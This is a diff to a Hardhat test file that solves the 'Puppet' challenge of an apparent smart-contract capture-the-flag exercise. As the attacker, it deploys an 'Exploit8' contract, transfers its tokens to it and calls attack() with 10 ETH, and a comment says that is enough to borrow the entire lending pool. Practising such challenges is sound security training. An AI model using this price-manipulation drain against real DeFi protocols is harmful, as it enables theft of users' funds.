@@ -31,6 +31,9 @@ describe('[Challenge] Puppet', function () {
 
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);
+        const exploitFactory = await ethers.getContractFactory('Exploit8', attacker);
+
+        this.e8 = await exploitFactory.deploy();
 
         await ethers.provider.send("hardhat_setBalance", [
             attacker.address,
@@ -103,6 +106,13 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // move tokens into contract
+        let balance = await this.token.balanceOf(attacker.address);
+        await this.token.connect(attacker).transfer(this.e8.address, balance);
+
+        // only need 10 eth to borrow entire pool (about 9.9 actually)
+        await this.e8.connect(attacker).attack(this.uniswapExchange.address, this.token.address, this.lendingPool.address, {value: ethers.utils.parseEther("10")});
+
     });
 
     after(async function () {
